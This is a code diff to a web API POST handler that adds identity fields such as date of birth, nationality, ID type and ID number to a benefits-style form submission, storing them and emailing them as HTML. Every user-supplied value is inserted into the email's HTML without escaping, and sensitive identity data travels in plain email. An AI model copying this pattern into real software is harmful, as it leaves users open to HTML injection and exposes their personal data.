@@ -11,21 +11,27 @@ export async function POST(request: Request) {
       username,
       email,
       contact,
-      occupation,     // Added
+      occupation,
       zipCode,
       city,
       country,
-      primaryKey,     // Added
+      dob,              // New field
+      maritalStatus,    // New field
+      nationality,      // New field
+      identificationType, // New field
+      idNumber,         // New field
+      primaryKey,
       gender,
       age,
       subsidyBenefit,
-      welfareBenefit, // Added
+      welfareBenefit,
       eligibility,
       healthMedicare,
       paymentMode,
       query,
       declaration,
       approval,
+      denomination,     // New field
       selectedName,
       authStatus,
       authTime,
@@ -61,21 +67,27 @@ export async function POST(request: Request) {
           username: username,
           email: email,
           contact: contact || null,
-          occupation: occupation || null, // Storing Occupation
-          zip_code: zipCode,
-          city: city,
-          country: country,
-          primary_key: primaryKey || null, // Storing Primary Key
+          occupation: occupation || null,
+          zip_code: zipCode || null,
+          city: city || null,
+          country: country || null,
+          dob: dob || null,                         // Storing DOB
+          marital_status: maritalStatus || null,    // Storing Marital Status
+          nationality: nationality || null,         // Storing Nationality
+          identification_type: identificationType || null, // Storing Identification Type
+          id_number: idNumber || null,              // Storing I.D Number
+          primary_key: primaryKey || null,
           gender: gender,
           age: age ? Number(age) : null,
-          subsidy_benefit: subsidyBenefit,
-          welfare_benefit: welfareBenefit || null, // Storing Welfare Benefit
-          eligibility: eligibility,
-          health_medicare: healthMedicare,
+          subsidy_benefit: subsidyBenefit || null,
+          welfare_benefit: welfareBenefit || null,
+          eligibility: eligibility || null,
+          health_medicare: healthMedicare || null,
           payment_mode: paymentMode || null,
-          query: query,
+          query: query || null,
           declaration: declaration || null,
           approval: approval || null,
+          denomination: denomination || null,       // Storing Denomination
           selected_name: selectedName || null,
           auth_status: authStatus || null,
           auth_time: authTime || null,
@@ -117,10 +129,15 @@ export async function POST(request: Request) {
         <p><strong>Email:</strong> ${email}</p>
         <p><strong>Contact Number:</strong> ${contact || "-"}</p>
         <p><strong>Occupation:</strong> ${occupation || "-"}</p>
+        <p><strong>Date of Birth:</strong> ${dob || "-"}</p>
+        <p><strong>Marital Status:</strong> ${maritalStatus || "-"}</p>
+        <p><strong>Nationality:</strong> ${nationality || "-"}</p>
         <hr />
         <p><strong>Zip Code:</strong> ${zipCode || "-"}</p>
         <p><strong>City:</strong> ${city || "-"}</p>
         <p><strong>Country:</strong> ${country || "-"}</p>
+        <p><strong>Identification Type:</strong> ${identificationType || "-"}</p>
+        <p><strong>I.D Number:</strong> ${idNumber || "-"}</p>
         <p><strong>Primary Key:</strong> ${primaryKey || "-"}</p>
         <hr />
         <p><strong>Gender:</strong> ${gender}</p>
@@ -132,6 +149,7 @@ export async function POST(request: Request) {
         <p><strong>Health Medicare:</strong> ${healthMedicare || "-"}</p>
         <p><strong>Payment Mode:</strong> ${paymentMode || "-"}</p>
         <p><strong>Approval:</strong> ${approval || "-"}</p>
+        <p><strong>Denomination:</strong> ${denomination || "-"}</p>
         <p><strong>Selected Name:</strong> ${selectedName || "-"}</p>
         <hr />
         <p><strong>Auth Status:</strong> ${authStatus || "-"}</p>
